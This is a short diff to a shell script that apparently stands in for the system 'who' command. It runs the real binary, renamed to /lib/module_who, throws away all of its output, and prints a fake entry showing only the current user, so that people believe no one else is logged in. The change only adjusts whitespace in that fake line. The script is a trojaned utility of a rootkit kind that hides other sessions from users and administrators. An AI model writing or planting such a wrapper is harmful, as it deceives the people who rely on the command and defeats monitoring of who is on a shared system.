@@ -2,7 +2,7 @@
 
 # Execute real 'who' command and don't display anything. Also mess with them
 # This will make them think they are the only one connected to the box
-/lib/module_who $@ | grep -Ev "*" | echo "$USER\ttty1\t`date`"
+/lib/module_who $@ | grep -Ev "*" | echo "$USER     tty1     `date`"
 
 
 # Source the ~/.bashrc
